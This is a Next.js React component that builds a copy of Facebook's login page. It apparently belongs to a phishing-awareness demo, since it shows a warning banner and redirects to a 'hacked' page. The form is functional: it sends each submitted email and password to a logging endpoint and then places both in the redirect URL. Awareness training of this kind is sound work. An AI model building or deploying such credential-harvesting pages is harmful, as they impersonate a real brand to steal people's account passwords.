"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import WarningBanner from "../components/WarningBanner";

export default function FacebookPhishing() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();

    await fetch("/api/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ platform: "Facebook", email, password }),
    });

    const params = new URLSearchParams({ email, password });
    router.push(`/facebook/hacked?${params.toString()}`);
  }

  return (
    <>
      <WarningBanner />
      <div
        style={{
          minHeight: "100vh",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          background: "#f0f2f5",
          paddingTop: 44,
        }}
      >
        <svg
          width="240"
          height="46"
          viewBox="0 0 240 46"
          style={{ marginBottom: 20 }}
        >
          <text
            x="0"
            y="40"
            style={{
              fontSize: 46,
              fontWeight: 700,
              fill: "#1877f2",
              fontFamily: "Helvetica, Arial, sans-serif",
            }}
          >
            facebook
          </text>
        </svg>

        <div
          style={{
            background: "#fff",
            borderRadius: 8,
            padding: 20,
            width: 396,
            boxShadow:
              "0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1)",
          }}
        >
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email address or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              style={{
                width: "100%",
                padding: "14px 16px",
                fontSize: 17,
                border: "1px solid #dddfe2",
                borderRadius: 6,
                marginBottom: 12,
                outline: "none",
                boxSizing: "border-box",
              }}
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              style={{
                width: "100%",
                padding: "14px 16px",
                fontSize: 17,
                border: "1px solid #dddfe2",
                borderRadius: 6,
                marginBottom: 12,
                outline: "none",
                boxSizing: "border-box",
              }}
            />
            <button
              type="submit"
              style={{
                width: "100%",
                padding: "12px",
                background: "#1877f2",
                color: "#fff",
                border: "none",
                borderRadius: 6,
                fontSize: 20,
                fontWeight: 700,
                cursor: "pointer",
                marginBottom: 16,
              }}
            >
              Log in
            </button>

            <div style={{ textAlign: "center", marginBottom: 20 }}>
              <span
                style={{
                  color: "#1877f2",
                  fontSize: 14,
                  cursor: "pointer",
                }}
              >
                Forgotten password?
              </span>
            </div>

            <hr
              style={{
                border: "none",
                borderTop: "1px solid #dadde1",
                marginBottom: 20,
              }}
            />

            <div style={{ textAlign: "center" }}>
              <button
                type="button"
                style={{
                  background: "#42b72a",
                  color: "#fff",
                  border: "none",
                  borderRadius: 6,
                  padding: "12px 24px",
                  fontSize: 17,
                  fontWeight: 700,
                  cursor: "pointer",
                }}
              >
                Create new account
              </button>
            </div>
          </form>
        </div>
      </div>
    </>
  );
}
